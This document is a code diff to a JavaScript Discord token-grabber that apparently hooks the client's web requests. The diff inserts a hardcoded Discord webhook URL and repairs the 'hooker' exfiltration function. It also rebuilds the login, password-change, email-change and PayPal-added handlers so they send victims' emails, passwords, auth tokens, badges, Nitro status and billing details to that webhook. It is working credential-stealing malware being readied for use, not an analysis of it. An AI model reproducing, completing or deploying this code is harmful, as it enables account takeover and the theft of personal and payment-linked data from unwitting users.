@@ -11,8 +11,7 @@ function sleep(ms) {
 }
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%HOOK_KEY%', 
+  webhook: 'https://discord.com/api/webhooks/1208130482123055145/8XTsyApwborD6qJbAXJK4z7m7waxwRUq930TCqYjnSfKaSlp23gKntRPMHTZGKYZoOkr',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
@@ -228,37 +227,41 @@ const getBadges = (flags) => {
 };
 
 const hooker = async (content) => {
+  const data = JSON.stringify(content);
   const url = new URL(config.webhook);
-  const data = JSON.stringify({ embeds: content.embeds }); // Stringify only the embeds array
   const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
+      'Content-Type': 'application/json',
+      'Access-Control-Allow-Origin': '*',
   };
 
+  if (!config.webhook.includes('api/webhooks')) {
+      console.log("Invalid webhook URL");
+      return;
+  }
+
   const options = {
-    protocol: url.protocol,
-    hostname: url.hostname,
-    path: url.pathname,
-    method: 'POST',
-    headers: headers,
+      protocol: url.protocol,
+      hostname: url.host,
+      path: url.pathname,
+      method: 'POST',
+      headers: headers,
   };
 
   const req = https.request(options, (res) => {
-    console.log(`statusCode: ${res.statusCode}`);
-    res.on('data', (d) => {
-      process.stdout.write(d);
-    });
+      console.log(`statusCode: ${res.statusCode}`);
+      res.on('data', (d) => {
+          process.stdout.write(d);
+      });
   });
 
   req.on('error', (err) => {
-    console.error(err);
+      console.error(err);
   });
 
   req.write(data);
   req.end();
 };
 
-  
 
 const login = async (email, password, token) => {
   const json = await getInfo(token);
@@ -266,51 +269,52 @@ const login = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    content: config.ping_val,
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
+      username: config.embed_name,
+      avatar_url: config.embed_icon,
+      embeds: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}**`,
-            inline: false,
+              color: config.embed_color,
+              fields: [
+                  {
+                      name: '**Account Info**',
+                      value: `Email: **${email}**`,
+                      inline: false,
+                  },
+                  {
+                      name: '**Password:**',
+                      value: `**${password}**`,
+                      inline: false,
+                  },
+                  {
+                      name: '**Token**',
+                      value: `\`${token}\``,
+                      inline: false,
+                  },
+                  {
+                      name: 'Badges:',
+                      value: `**${badges}**`,
+                      inline: false,
+                  },
+                  {
+                      name: 'Nitro Type:',
+                      value: `**${nitro}**`,
+                      inline: true,
+                  },
+                  {
+                      name: 'Billing:',
+                      value: `**${billing}**`,
+                      inline: true,
+                  },
+              ],
+              author: {
+                  name: `${json.username}#${json.discriminator} | ${json.id}`,
+                  icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+              },
           },
-          {
-            value: `Password: **${password}**`,
-            inline: false,
-          },
-          {
-            name: 'Token',
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
+      ],
   };
-  hooker(content);
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  await hooker(content);
 };
 
 const passwordChanged = async (newpassword, token) => {
@@ -319,52 +323,52 @@ const passwordChanged = async (newpassword, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
+      username: config.embed_name,
+      avatar_url: config.embed_icon,
+      embeds: [
           {
-            name: `**Password Changed**`,
-            value: `Email: **${json.email}**`,
-            inline: true,
+              color: config.embed_color,
+              fields: [
+                  {
+                      name: '**Password Changed**',
+                      value: `Email: **${json.email}**`,
+                      inline: true,
+                  },
+                  {
+                      name: '**New Password:**',
+                      value: `**${newpassword}**`,
+                      inline: false,
+                  },
+                  {
+                      name: '**Token**',
+                      value: `\`${token}\``,
+                      inline: false,
+                  },
+                  {
+                      name: 'Badges:',
+                      value: `**${badges}**`,
+                      inline: false,
+                  },
+                  {
+                      name: 'Nitro Type:',
+                      value: `**${nitro}**`,
+                      inline: true,
+                  },
+                  {
+                      name: 'Billing:',
+                      value: `**${billing}**`,
+                      inline: true,
+                  },
+              ],
+              author: {
+                  name: `${json.username}#${json.discriminator} | ${json.id}`,
+                  icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+              },
           },
-          {
-            name: '**New Password:**',
-            value: ```**${newpassword}**```,
-            inline: false,
-          },
-          {
-            name: 'Token',
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
+      ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  await hooker(content);
 };
 
 const emailChanged = async (email, password, token) => {
@@ -373,94 +377,101 @@ const emailChanged = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
+      username: config.embed_name,
+      avatar_url: config.embed_icon,
+      embeds: [
           {
-            name: '**Email Changed**',
-            value: `New Email: ``**${email}**```,
-            inline: true,
+              color: config.embed_color,
+              fields: [
+                  {
+                      name: '**Email Changed**',
+                      value: `New Email: **${email}**`,
+                      inline: true,
+                  },
+                  {
+                      name: '**Password:**',
+                      value: `**${password}**`,
+                      inline: false,
+                  },
+                  {
+                      name: '**Token**',
+                      value: `\`${token}\``,
+                      inline: false,
+                  },
+                  {
+                      name: 'Badges:',
+                      value: `**${badges}**`,
+                      inline: false,
+                  },
+                  {
+                      name: 'Nitro Type:',
+                      value: `**${nitro}**`,
+                      inline: true,
+                  },
+                  {
+                      name: 'Billing:',
+                      value: `**${billing}**`,
+                      inline: true,
+                  },
+              ],
+              author: {
+                  name: `${json.username}#${json.discriminator} | ${json.id}`,
+                  icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+              },
           },
-          {
-            value: `Password: ``**${password}**```,
-            inline: false,
-          },
-          {
-            name: `**Token**`,
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            value: `Badges: **${badges}**`,
-            inline: false,
-          },
-          {
-            value: `Nitro Type: ``**${nitro}**```,
-            inline: true,
-          },
-          {
-            value: `Billing: ``**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
+      ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  await hooker(content);
 };
 
 const PaypalAdded = async (token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
-  const billing = getBilling(token);
+  const billing = await getBilling(token);
   const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
+      username: config.embed_name,
+      avatar_url: config.embed_icon,
+      embeds: [
           {
-            name: '**Paypal Added**',
-            value: `okay but what now ??`,
-            inline: false,
+              color: config.embed_color,
+              fields: [
+                  {
+                      name: '**Paypal Added**',
+                      value: 'Okay but what now?',
+                      inline: false,
+                  },
+                  {
+                      name: '**Token**',
+                      value: `\`${token}\``,
+                      inline: false,
+                  },
+                  {
+                      name: 'Badges:',
+                      value: `**${badges}**`,
+                      inline: false,
+                  },
+                  {
+                      name: 'Nitro Type:',
+                      value: `**${nitro}**`,
+                      inline: true,
+                  },
+                  {
+                      name: 'Billing:',
+                      value: `**${billing}**`,
+                      inline: true,
+                  },
+              ],
+              author: {
+                  name: `${json.username}#${json.discriminator} | ${json.id}`,
+                  icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+              },
           },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            value: `Badges: **${badges}**`,
-            inline: false,
-          },
-          {
-            value: `Nitro Type: ``**${nitro}**```,
-            inline: true,
-          },
-          {
-            value: `Billing: ``**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
+      ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  await hooker(content);
 };
 
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
